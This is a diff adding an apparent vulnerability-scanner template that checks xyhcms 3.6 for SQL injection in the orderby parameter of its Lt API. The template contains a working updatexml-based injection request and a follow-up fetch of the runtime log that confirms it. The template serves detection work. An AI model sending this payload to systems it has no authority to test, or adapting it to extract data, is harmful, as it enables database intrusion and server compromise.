@@ -1,0 +1,40 @@
+id: xyhcms-sqli-ltcontroller
+
+info:
+  name: xyhcms LtController SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    In xyhcms version 3.6, ThinkPHP can use key to construct SQL statements for injection when processing order by sorting. This vulnerability allows an attacker to exploit SQL injection vulnerabilities to obtain database information or even gain server system permissions.
+  tags: sql-injection
+  reference:
+    - http://althims.com/2020/02/03/xyhcms-3-6/
+
+variables:
+  random_md5: "{{md5(rand_int(10, 99))}}"
+
+http:
+  - raw:
+      - |
+        GET /index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5({{random_md5}})),0x3a),1);]=1 HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: md5_match
+        regex:
+          - "(?i)\b[a-f0-9]{32}\b"
+        internal: true
+
+  - raw:
+      - |
+        GET /App/Runtime/Logs/Api/{{date_time('06_01_02')}}.log HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{random_md5}}"
+      - type: status
+        status:
+          - 200
